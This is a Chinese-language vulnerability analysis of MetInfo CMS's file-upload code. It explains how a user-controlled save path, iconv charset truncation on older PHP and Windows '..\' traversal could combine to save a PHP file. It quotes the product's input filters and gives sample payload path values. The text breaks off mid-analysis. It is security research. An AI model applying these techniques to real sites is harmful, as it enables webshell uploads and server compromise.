<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ($value === <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> ($name) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;savepath&#x27;</span>:</span><br><span class="line">			<span class="keyword">$this</span>-&gt;savepath = path_standard(PATH_WEB.<span class="string">&#x27;upload/&#x27;</span>.$value);</span><br></pre></td></tr></table></figure>
<p>在设置完上传的基本配置后,接着调用upload方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$formname</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $_M;</span><br><span class="line"></span><br><span class="line">	$back = <span class="keyword">$this</span>-&gt;upfile-&gt;upload($formname);</span><br><span class="line">	<span class="keyword">return</span> $back;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后调用upfile对象的upload方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$form = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">global</span> $_M;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($form)&#123;</span><br><span class="line">		<span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $val)&#123;</span><br><span class="line">			<span class="keyword">if</span>($form == $key)&#123;</span><br><span class="line">				$filear = $_FILES[$key];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!$filear)&#123;</span><br><span class="line">		<span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $val)&#123;</span><br><span class="line">			$filear = $_FILES[$key];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>在upload方法当中, 首先接收_FILES保存到filear变量当中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;getext($filear[<span class="string">&quot;name&quot;</span>]); <span class="comment">//获取允许的后缀</span></span><br><span class="line"><span class="keyword">if</span> (strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">&#x27;php&#x27;</span>||strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">&#x27;aspx&#x27;</span>||strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">&#x27;asp&#x27;</span>||strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">&#x27;jsp&#x27;</span>||strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">&#x27;js&#x27;</span>||strtolower(<span class="keyword">$this</span>-&gt;ext)==<span class="string">&#x27;asa&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="keyword">$this</span>-&gt;ext.<span class="string">&quot; <span class="subst">&#123;$_M[&#x27;word&#x27;][&#x27;upfileTip3&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_M[<span class="string">&#x27;config&#x27;</span>][<span class="string">&#x27;met_file_format&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">if</span>($_M[<span class="string">&#x27;config&#x27;</span>][<span class="string">&#x27;met_file_format&#x27;</span>] != <span class="string">&quot;&quot;</span> &amp;&amp; !in_array(strtolower(<span class="keyword">$this</span>-&gt;ext), explode(<span class="string">&#x27;|&#x27;</span>,strtolower($_M[<span class="string">&#x27;config&#x27;</span>][<span class="string">&#x27;met_file_format&#x27;</span>]))) &amp;&amp; $filear)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="keyword">$this</span>-&gt;ext.<span class="string">&quot; <span class="subst">&#123;$_M[&#x27;word&#x27;][&#x27;upfileTip3&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="keyword">$this</span>-&gt;ext.<span class="string">&quot; <span class="subst">&#123;$_M[&#x27;word&#x27;][&#x27;upfileTip3&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;format) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;format != <span class="string">&quot;&quot;</span> &amp;&amp; !in_array(strtolower(<span class="keyword">$this</span>-&gt;ext), explode(<span class="string">&#x27;|&#x27;</span>,strtolower(<span class="keyword">$this</span>-&gt;format))) &amp;&amp; $filear) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="keyword">$this</span>-&gt;ext.<span class="string">&quot; <span class="subst">&#123;$_M[&#x27;word&#x27;][&#x27;upfileTip3&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着获取上传文件名的后缀, 首先经过一次黑名单校验然后再继续白名单校验,在这里白名单校验后缀无法绕过所以只能上传以下格式文件<br>rar|zip|sql|doc|pdf|jpg|xls|png|gif|mp3|jpeg|bmp|swf|flv|ico</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件名重命名</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;set_savename($filear[<span class="string">&quot;name&quot;</span>], <span class="keyword">$this</span>-&gt;is_rename);</span><br><span class="line"><span class="comment">//新建保存文件</span></span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="keyword">$this</span>-&gt;savepath, PATH_WEB.<span class="string">&#x27;upload/&#x27;</span>) !== <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error($_M[<span class="string">&#x27;word&#x27;</span>][<span class="string">&#x27;upfileFail2&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strstr(<span class="keyword">$this</span>-&gt;savepath, <span class="string">&#x27;./&#x27;</span>))&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error($_M[<span class="string">&#x27;word&#x27;</span>][<span class="string">&#x27;upfileTip3&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!makedir(<span class="keyword">$this</span>-&gt;savepath)) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error($_M[<span class="string">&#x27;word&#x27;</span>][<span class="string">&#x27;upfileFail2&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在通过白名单校验之后,开始设置文件名,如果this-&gt;is_rename为false,那么上传的文件就不会被重命名,而is_rename可以由_M[‘form’][‘is_rename’]控制。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">set_savename</span>(<span class="params">$filename, $is_rename</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ($is_rename) &#123;</span><br><span class="line">			srand((<span class="keyword">double</span>)microtime() * <span class="number">1000000</span>);</span><br><span class="line">			$rnd = rand(<span class="number">100</span>, <span class="number">999</span>);</span><br><span class="line">			$filename = date(<span class="string">&#x27;U&#x27;</span>) + $rnd;</span><br><span class="line">			$filename = $filename.<span class="string">&quot;.&quot;</span>.<span class="keyword">$this</span>-&gt;ext;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$name_verification = explode(<span class="string">&#x27;.&#x27;</span>,$filename);</span><br><span class="line">			$verification_mun = count($name_verification);</span><br><span class="line">			<span class="keyword">if</span>($verification_mun&gt;<span class="number">2</span>)&#123;</span><br><span class="line">				$verification_mun1 = $verification_mun<span class="number">-1</span>;</span><br><span class="line">				$name_verification1 = $name_verification[<span class="number">0</span>];</span><br><span class="line">				<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$verification_mun1;$i++)&#123;</span><br><span class="line">					$name_verification1 .= <span class="string">&#x27;_&#x27;</span>.$name_verification[$i];</span><br><span class="line">				&#125;</span><br><span class="line">				$name_verification1 .= <span class="string">&#x27;.&#x27;</span>.$name_verification[$verification_mun1];</span><br><span class="line">				$filename = $name_verification1;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			$filename = str_replace(<span class="keyword">array</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;/&quot;</span> , <span class="string">&quot;\\&quot;</span> , <span class="string">&quot;\&quot;&quot;</span> , <span class="string">&quot;&lt;&quot;</span> , <span class="string">&quot;&gt;&quot;</span> , <span class="string">&quot;——&quot;</span> , <span class="string">&quot; &quot;</span> ),<span class="string">&#x27;_&#x27;</span>,$filename);</span><br><span class="line">			<span class="keyword">if</span> (stristr(PHP_OS,<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">				$filename_temp = @iconv(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;GBK&quot;</span>,$filename);</span><br><span class="line">			&#125;<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				$filename_temp = $filename;</span><br><span class="line">			&#125;</span><br><span class="line">			$i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">			$savename_temp=str_replace(<span class="string">&#x27;.&#x27;</span>.<span class="keyword">$this</span>-&gt;ext,<span class="string">&#x27;&#x27;</span>,$filename_temp);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (file_exists(<span class="keyword">$this</span>-&gt;savepath.$filename_temp)) &#123;</span><br><span class="line">				$i++;</span><br><span class="line">				$filename_temp = $savename_temp.<span class="string">&#x27;(&#x27;</span>.$i.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;.&#x27;</span>.<span class="keyword">$this</span>-&gt;ext;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> ($i != <span class="number">0</span>) &#123;</span><br><span class="line">				$filename = str_replace(<span class="string">&#x27;.&#x27;</span>.<span class="keyword">$this</span>-&gt;ext,<span class="string">&#x27;&#x27;</span>,$filename).<span class="string">&#x27;(&#x27;</span>.$i.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;.&#x27;</span>.<span class="keyword">$this</span>-&gt;ext;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>从该方法中可以看出保护,就算文件名不重命名, 在文件名中含有多个.的情况下, 除了最后一个.其他的都会被替换为_,所以并不能利用。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/metu_1.jpg" alt="-w1041"></p>
<p>设置完文件名后, 又开始对this-&gt;savepath保存目录进行检验, 同样savepath也可以由_M[‘form’][‘savepath’]设置。首先通过strstr检测路径中是否含有./字符,如果存在直接结束流程,所以也不能使用../进行目录穿越。不过在windows中还可以使用..\实现目录穿越。<br>接着调用makedir处理目录,</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makedir</span>(<span class="params">$dir</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">	$dir = path_absolute($dir);</span><br><span class="line"></span><br><span class="line">	@clearstatcache();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(file_exists($dir))&#123;</span><br><span class="line">		$result=<span class="literal">true</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$fileUrl = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		$fileArr = explode(<span class="string">&#x27;/&#x27;</span>, $dir);</span><br><span class="line">		$result = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">foreach</span>($fileArr <span class="keyword">as</span> $val)&#123;</span><br><span class="line">			$fileUrl .= $val . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">			<span class="keyword">if</span>(!file_exists($fileUrl))&#123;</span><br><span class="line">				$result = mkdir($fileUrl);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	@clearstatcache();</span><br><span class="line">	<span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>makedir方法的作用为判断一个目录是否存在,如果不存在会一层一层的创建目录。在处理完保存路径后,将路径和文件名拼接起来成为上传的目标地址,最终实现上传。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//复制文件</span></span><br><span class="line">$upfileok=<span class="number">0</span>;</span><br><span class="line">$file_tmp=$filear[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">$file_name=<span class="keyword">$this</span>-&gt;savepath.<span class="keyword">$this</span>-&gt;savename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (stristr(PHP_OS,<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">	$file_name = @iconv(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;GBK&quot;</span>,$file_name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&quot;move_uploaded_file&quot;</span>)) &#123;</span><br><span class="line">	<span class="keyword">if</span> (move_uploaded_file($file_tmp, $file_name)) &#123;</span><br><span class="line">		$upfileok=<span class="number">1</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (copy($file_tmp, $file_name)) &#123;</span><br><span class="line">		$upfileok=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (copy($file_tmp, $file_name)) &#123;</span><br><span class="line">	$upfileok=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终的保存文件名由目录和文件名拼接而成,文件名来自_FILES变量,目录来自GPC。在PHP的_FILES文件上传当中,并不存在00截断问题,并且多后缀文件名会被处理,所以这里我们重点关注目录。目录是来自_M[‘form’][‘savepath’]所以用户可控,那么如果存在截断漏洞可以尝试将目录控制为xxx.php\0最终保存路径类似c:/xxx/xxx.php\0/a.jpg实现上传php文件。不过在metinfo当中,在处理GPC保存到_M[‘form’][‘savepath’]时数据会经过addslashes处理,如果这里不会存在00截断问题。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stristr(PHP_OS,<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">			$file_name = @iconv(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;GBK&quot;</span>,$file_name);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (function_exists(<span class="string">&quot;move_uploaded_file&quot;</span>)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (move_uploaded_file($file_tmp, $file_name)) &#123;</span><br></pre></td></tr></table></figure>
<p>虽然不存在00截断问题,但是在这里可以看到如果系统为windows,在保存文件前对保存路径使用iconv转换了字符集。</p>
<h3 id="iconv-truncate"><a href="#iconv-truncate" class="headerlink" title="iconv truncate"></a>iconv truncate</h3><p>在iconv转换字符集时,如果字符串中存在源字符集序列不允许的字符时会造成截断问题。UTF-8在单字节时允许的范围为0x00-0x7F, 如果转换的字符不在该范围之内会出PHP_ICONV_ERR_ILLEGAL_SEQ错误, 并且在出错之后不再处理后面的字符造成截断。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/metu_2.jpg"></p>
<p>不过从上图可以看出在php&lt;5.4时,转换字符集能够造成截断,但在5.4及以上版本中会返回false。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/metu_3.jpg"><br>从上图可以看出,在PHP5.3当中,只要out_buffer不为空无论err为何值都能正常返回。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/metu_4.jpg"><br>而在PHP5.4当中, 只有当err为PHP_ICONV_ERR_SUCCESS且out_buffer不为空时才会正常返回, 否则返回FALSE。</p>
<hr>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/metu_5.jpg" alt="-w704"></p>
<p>再回到metinfo当中,首先尝试把savepath设置为xxx.php%81测试,失败。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!makedir(<span class="keyword">$this</span>-&gt;savepath)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error($_M[<span class="string">&#x27;word&#x27;</span>][<span class="string">&#x27;upfileFail2&#x27;</span>]);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>这是因为metinfo会调用makedir对目录处理,如果目录不存在那么会调用mkdir方法进行处理。这里xxx.php%81目录肯定不存在那么会调用mkdir创建该目录,但是mkdir时如果目录名存在不合法字符会创建失败，一旦目录创建失败将会退出流程。所以这里我们需要使用目录穿越, 将savepath控制为类似c:/xxxx/upload/xxx.php\x80/../,在windows当中就算目录不存在也能够实现目录穿越,所以该目录会判断为存在就不会再调用mkdir来创建目录。<br>之前也谈到了,在对savepath的校验中有检测是否含有./字符,所以不能再使用../实现目录穿越,但是在windows下可以使用..\实现目录穿越。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/metu_6.jpg" alt="-w628"><br>不过测试发现,目录设置为a.php%81/..\时, 直接被保存到了upload中,自己设置的目录消失了。</p>
<p>在metinfo中,对GPC处理保存到_M[‘form’]时</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">load_form</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $_M;</span><br><span class="line">	$_M[<span class="string">&#x27;form&#x27;</span>] =<span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;GLOBALS&#x27;</span>]) &amp;&amp; <span class="keyword">exit</span>(<span class="string">&#x27;Access Error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">&#x27;_&#x27;</span> &amp;&amp; $_M[<span class="string">&#x27;form&#x27;</span>][$_key] = daddslashes($_value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">&#x27;_&#x27;</span> &amp;&amp; $_M[<span class="string">&#x27;form&#x27;</span>][$_key] = daddslashes($_value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">&#x27;_&#x27;</span> &amp;&amp; $_M[<span class="string">&#x27;form&#x27;</span>][$_key] = daddslashes($_value);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>调用daddslashes对GPC处理,    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span>(<span class="params">$string, $force = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">	!defined(<span class="string">&#x27;MAGIC_QUOTES_GPC&#x27;</span>) &amp;&amp; define(<span class="string">&#x27;MAGIC_QUOTES_GPC&#x27;</span>, get_magic_quotes_gpc());</span><br><span class="line">	<span class="keyword">if</span>(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line">		<span class="keyword">if</span>(is_array($string)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">				$string[$key] = daddslashes($val, $force);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(!defined(<span class="string">&#x27;IN_ADMIN&#x27;</span>))&#123;</span><br><span class="line">				$string = trim(addslashes(sqlinsert($string)));</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$string = trim(addslashes($string));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到除了addslashes处理,如果没有设置IN_ADMIN常量还会经过sqlinsert处理,</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlinsert</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(is_array($string))&#123;</span><br><span class="line">		<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">			$string[$key] = sqlinsert($val);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$string_old = $string;</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;/&quot;</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;/&quot;</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;/&quot;</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;*&quot;</span>,<span class="string">&quot;/&quot;</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;%5C&quot;</span>,<span class="string">&quot;/&quot;</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;%22&quot;</span>,<span class="string">&quot;/&quot;</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;%27&quot;</span>,<span class="string">&quot;/&quot;</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;%2A&quot;</span>,<span class="string">&quot;/&quot;</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;~&quot;</span>,<span class="string">&quot;/&quot;</span>,$string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;select&quot;</span>, <span class="string">&quot;\sel\ect&quot;</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;insert&quot;</span>, <span class="string">&quot;\ins\ert&quot;</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;update&quot;</span>, <span class="string">&quot;\up\date&quot;</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;delete&quot;</span>, <span class="string">&quot;\de\lete&quot;</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;union&quot;</span>, <span class="string">&quot;\un\ion&quot;</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;into&quot;</span>, <span class="string">&quot;\in\to&quot;</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;load_file&quot;</span>, <span class="string">&quot;\load\_\file&quot;</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;outfile&quot;</span>, <span class="string">&quot;\out\file&quot;</span>, $string);</span><br><span class="line">		$string = str_ireplace(<span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;\sle\ep&quot;</span>, $string);</span><br><span class="line">		$string = strip_tags($string);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($string_old!=$string)&#123;</span><br><span class="line">			$string=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$string = trim($string);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
